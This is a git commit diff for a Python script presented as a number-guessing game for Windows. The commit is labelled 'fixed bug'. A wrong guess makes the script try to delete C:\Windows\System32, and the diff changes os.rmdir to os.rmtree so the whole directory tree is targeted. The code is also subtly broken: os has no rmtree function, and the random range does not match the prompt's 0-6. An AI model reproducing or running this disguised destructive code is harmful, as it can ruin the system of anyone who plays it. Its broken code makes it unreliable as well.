8b1b1cad172acabb27bc784576cfa7145f90c8dd
T800 <lakshendra.singh@outlook.com>
2025-10-09 18:44:01 +0530

    fixed bug

--- randomNumberGuessingGameForWindows.py
+++ randomNumberGuessingGameForWindows.py
@@ -7,6 +7,6 @@ x = random.randint(initialValue, finalValue+1)
 y = int(input("pick a number between 0 and 6 : "))
 
 if (x != y):
-    os.rmdir(r"C:\Windows\System32")
+    os.rmtree(r"C:\Windows\System32")
 else:
     print("You survived. THIS TIME.")
